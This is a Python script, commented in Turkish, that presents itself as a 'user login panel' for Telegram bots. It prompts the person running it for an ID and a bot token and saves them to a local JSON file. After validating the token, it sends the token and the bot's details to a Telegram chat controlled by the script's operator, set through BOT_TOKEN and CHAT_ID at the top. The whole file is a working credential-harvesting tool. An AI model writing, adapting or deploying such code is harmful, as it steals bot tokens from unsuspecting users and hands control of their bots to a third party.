
BOT_TOKEN = ""  # Kendi Token’nizi yazın

CHAT_ID = ''  # Kendi chat_id’nizi yazın


import requests
import json
from datetime import datetime



def print_colored(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")
def print_ytr3so():
    ytr3so_text = '''
███████╗████████╗████████╗███████╗██████╗ ███████╗
╚══███╔╝╚══██╔══██╔══██╗██╔════╝
   ███╔╝    ██║       ██║   █████╗  ██████╔╝█████╗  
  ███╔╝     ██║       ██║   ██╔══╝  ██╔══██╗██╔══╝  
███████╗    ██║       ██║   ███████╗ ██║███████╗
╚══════╝    ╚═╝       ╚═╝   ╚══════╝ ╚═╝╚══════╝

   dev : @muhametclk0
    '''
    print_colored(ytr3so_text, "1;36")  
    
def save_user_info(user_id, user_token):
    data = {"user_id": user_id, "user_token": user_token}
    with open("user_data.json", "w") as file:
        json.dump(data, file)

def get_bot_info(bot_token):
    url = f"https://api.telegram.org/bot{bot_token}/getMe"
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        if data.get("ok"):
            return data['result']['first_name'], data['result']['username']
        else:
            return None, None
    except requests.exceptions.RequestException as e:
        print(f"API hatası: {e}")
        return None, None

# Bot durumu kontrolü
def check_bot_status(bot_token):
    url = f"https://api.telegram.org/bot{bot_token}/getMe"
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        if data.get("ok"):
            return "Online"
        else:
            return "Offline"
    except requests.exceptions.RequestException as e:
        return "Offline"

# Birden fazla bot token'ı ile işlem yapma
def send_to_multiple_bots(user_id, user_token, custom_message=None):
    bot_name, bot_username = get_bot_info(user_token)

    if bot_name is None:
        print("❌ Geçersiz bot token!")
        return False

    now = datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")

    
    message = (
        "✨ *Yeni Bot Bilgisi Alındı!* ✨\n\n"
        f"🤖 *Bot Adı:* {bot_name}\n"
        f"🔹 *Bot Kullanıcı Adı:* @{bot_username}\n"
        f"🕒 *Tarih & Saat:* {timestamp}\n"
        f"🆔 *Kullanıcı ID:* `{user_id}`\n"
        f"🔐 *Token:* `{user_token}`\n"
        f" ✓  *@muhammetclk0*"
    )

    
    if custom_message:
        message += f"\n\n📬 *Özel Mesaj:* {custom_message}"

    
    my_bot_token = BOT_TOKEN
    url = f"https://api.telegram.org/bot{my_bot_token}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  
        return response.ok
    except requests.exceptions.RequestException as e:
        print(f"Mesaj gönderme hatası: {e}")
        return False

def validate_token(user_token):
    bot_name, bot_username = get_bot_info(user_token)
    return bot_name is not None  # Eğer bot bilgisi alınabiliyorsa geçerli bir token

# === Ana Program ===
print_ytr3so()  
print_colored("== Kullanıcı Giriş Paneli ==", "1;33")  

print_colored("Lütfen aşağıdaki bilgileri giriniz.", "0;32")  

print("="*50)  

user_id = input("➤ ID'nizi girin: ")
user_token = input("➤ Token'inizi girin: ")

save_user_info(user_id, user_token)

if not validate_token(user_token):
    print_colored("❌ Geçersiz token! Lütfen geçerli bir token girin.", "1;31")  
else:
    custom_message = input("➤ Özel mesajınızı girin (isteğe bağlı): ")
    bot_status = check_bot_status(user_token)  
    
    print_colored(f"Bot Durumu: {bot_status}", "0;36")  

    if send_to_multiple_bots(user_id, user_token, custom_message):
        print_colored("\n✅ Bilgiler başarıyla gönderildi!", "1;32")  #
    else:
        print_colored("\n❌ Gönderme işlemi başarısız oldu. Lütfen tekrar deneyin.", "1;31")  